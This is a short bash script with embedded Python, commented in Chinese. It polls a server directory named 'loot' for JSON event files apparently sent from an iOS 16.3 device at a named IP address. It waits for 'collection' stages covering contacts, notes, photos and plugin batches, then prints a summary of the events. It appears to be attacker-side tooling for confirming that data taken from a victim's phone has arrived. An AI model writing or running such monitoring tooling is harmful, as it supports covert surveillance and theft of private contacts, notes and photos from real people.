#!/bin/bash
# 盯 16.3 设备（31.6.63.101）采集阶段：plugin_batch_done / contacts / notes / photo
D=/www/wwwroot/i.131422.com/loot/31.6.63.101
SEEN=/tmp/hg_163_seen.txt
HIT=/tmp/hg_163_hit
: > "$SEEN"; rm -f "$HIT"
END=$(( $(date +%s) + 900 ))
CD=$(ls -d /www/wwwroot/i.131422.com/loot/31.6.63.101 2>/dev/null)
echo "[$(date -u +%T)] watcher163 start (15min cap)"
while [ "$(date +%s)" -lt "$END" ]; do
  for f in "$D"/*.json /www/wwwroot/i.131422.com/loot/*/raw_avatar_*.json; do
    [ -f "$f" ] || continue
    case "$f" in *.meta.json) continue;; esac
    grep -qF "$f" "$SEEN" 2>/dev/null && continue
    case "$(basename "$f")" in *1789025*) : ;; *) continue;; esac
    echo "$f" >> "$SEEN"
    python3 - "$f" <<'PY'
import json, sys, os, datetime
f = sys.argv[1]
try: d = json.load(open(f))
except Exception: sys.exit()
et = d.get('et')
if et in ('plugin_download_ok',): sys.exit()
print('%s [%s] %-34s dev=%s os=%s bundle=%s total=%s entries=%s ok=%s sb=%s' % (
  os.path.basename(os.path.dirname(f))[:15],
  datetime.datetime.utcfromtimestamp(os.path.getmtime(f)).strftime('%H:%M:%S'),
  str(et), str(d.get('device')), str(d.get('pv')), str(d.get('bundleId'))[:28],
  str(d.get('total')), str(d.get('entries')), str(d.get('ok')), str(d.get('springboard'))))
PY
  done
  if ls "$D"/raw_avatar_put_*.json >/dev/null 2>&1 && \
     grep -l 'plugin_batch_done\|contacts_upload_completed\|notes' "$D"/raw_avatar_*.json 2>/dev/null | head -1 | grep -q .; then
    echo hit >> "$HIT"
  fi
  [ -s "$HIT" ] && { echo "[$(date -u +%T)] 命中 batch_done/采集事件"; break; }
  sleep 15
done
echo "=== watcher163 结束 $(date -u +%T) ==="
python3 - <<'PY'
import json, glob, collections, os, datetime
D = '/www/wwwroot/i.131422.com/loot/31.6.63.101'
rows = []
c = collections.Counter()
for f in glob.glob(D + '/*.json'):
    if f.endswith('.meta.json'): continue
    try: d = json.load(open(f))
    except: continue
    if not d.get('et'): continue
    c[d['et']] += 1
    if d['et'] != 'plugin_download_ok':
        rows.append((os.path.getmtime(f), d['et'], d.get('device'), d.get('pv'),
                     d.get('total'), d.get('entries'), d.get('ok'), d.get('springboard'),
                     d.get('bundleId'), d.get('fail_kind')))
print('事件统计:', dict(c))
print('--- 非 download_ok 明细 ---')
for m, et, dev, pv, t, e, ok, sb, b, fk in sorted(rows):
    print('  %s %-32s dev=%s os=%s total=%s ent=%s ok=%s sb=%s %s %s' % (
        datetime.datetime.utcfromtimestamp(m).strftime('%H:%M:%S'), et, dev, pv, t, e, ok, sb, b or '', fk or ''))
PY
